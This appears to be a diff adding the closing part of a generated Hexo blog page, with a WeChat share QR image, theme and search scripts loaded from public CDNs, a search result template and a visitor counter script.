+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACsklEQVR42u3awa7aMBAFUP7/p1up6o4S7p2J4VU6WSECjo8XtnM9j0d8/fpzPX/zfCV3k/ZftfM4ceHh4eGNup509/n3eZuvMMnQXP/rzRDg4eHhHeNdT9bXC8NmsK6Ryd03Fjw8PLyv8vJuJVvkth08PDy8/5E3iwna9tvPeHh4eN/i5bHsPjvNAW1MjIeHh/cZXnsA9hM+Hzzfw8PDw1tP33kUe9c2fd/Dv+3g4eHhHeDtt8uzkql8aNqjsqi7eHh4eGve5vV+cwCWLAyzQ7Vh4oKHh4cX8PKHbSLU5G5bWBD9Fw8PD+8ALy9vasuh8qBh05PhGwMeHh7eTbx2MSim5qAUoI0wiq08Hh4e3jHevoyp3Zq3h2fDp+Dh4eF9hDcrDkjihllwvBl0PDw8vHt57fH/ifAiB7RLFB4eHt45Xjuh79/025D3eshe/hIPDw/vAC+fpvMpPmcn3W0DZTw8PLzP8GYb3/zBdwW+q+fi4eHh3cTLu5JP3228294tChfw8PDwDvA2V7JFzsOF9iBtNmR4eHh4e971JJvHqXl5QbuJ30QVeHh4eKd5SUi6iX3rzuUlAncdfeHh4eGVvPbIKg8s8vj15kIEPDw8vAO8/IW/jXrvaiEvuoqWEzw8PLwDvPYgahMfnGuzoOLh4eEteJtD+iSMyMOONnSoVzw8PDy8NW9WxjTD70sH6v/i4eHhHeO1m+B8h77/b5st4OHh4Z3j3XX41Ea3+fC1BQr/ON/Dw8PDu5U3m3BnRVGzoZkVfg2PwfDw8PBiXrIYFIVN+/hgvTDg4eHhfYbXLgazTfZsCFaLEB4eHt4P4CWTchtqbAbxzVDi4eHhfZWXR73t97OBi5YWPDw8vGO8trttEWq+VLTLSbTXxsPDw7uVN3vVny0G7dHXZnHCw8PDO8D7DWu+K/C42THoAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
